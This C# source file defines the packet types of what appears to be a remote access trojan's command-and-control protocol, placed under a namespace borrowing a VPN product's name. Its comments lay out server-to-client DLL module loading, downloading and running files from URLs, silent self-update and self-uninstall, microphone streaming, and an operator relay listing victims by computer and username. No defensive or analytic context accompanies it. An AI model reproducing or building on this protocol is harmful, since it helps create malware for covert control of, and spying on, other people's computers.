namespace mullvad.Protocol
{
    public enum PacketType : byte
    {
        Handshake     = 0x01,
        Ping          = 0x02,
        Pong          = 0x03,
        Command       = 0x10,
        Response      = 0x11,

        // Module delivery / execution
        ModuleLoad    = 0x20,  // server → client: deliver module DLL chunk
        ModuleLoadAck = 0x21,  // client → server: module loaded or error
        ModuleExecute = 0x22,  // server → client: execute module action
        ModuleData    = 0x23,  // client → server: action response / stream frame
        ModuleStop    = 0x24,  // server → client: stop a streaming action

        // Client management
        ClientReconnect  = 0x30,  // server → client: close and reconnect immediately
        ClientTerminate  = 0x31,  // server → client: exit permanently (don't reconnect)
        ClientUninstall  = 0x32,  // server → client: delete self and exit
        ClientUpdate     = 0x33,  // server → client: download url and re-execute

        // Remote execute / microphone send
        ClientExecFile = 0x35,  // server → client: file chunk (base64) to write to temp and run
        ClientExecUrl  = 0x36,  // server → client: download url to temp and run
        ClientExecAck  = 0x37,  // client → server: exec result ack
        MicSendStart   = 0x38,  // server → client: start playing incoming server-mic stream
        MicSendData    = 0x39,  // server → client: 44100/2ch/16-bit PCM chunk (base64)
        MicSendStop    = 0x3A,  // server → client: stop playback

        Disconnect    = 0xFF,

        // VPS relay protocol — operator ↔ host (0xA0–0xA6)
        VpsAuth        = 0xA0,  // operator → vps: {"password":"..."}
        VpsAuthOk      = 0xA1,  // vps → operator: {}
        VpsAuthFail    = 0xA2,  // vps → operator: {"reason":"..."}
        VpsClientList  = 0xA3,  // vps → operator: {"clients":[...]}
        VpsClientJoin  = 0xA4,  // vps → operator: {id,computer,username,...}
        VpsClientLeave = 0xA5,  // vps → operator: {"id":"..."}
        VpsRelay       = 0xA6,  // bidirectional: {"id":"...","data":"<base64 packet>"}
    }
}
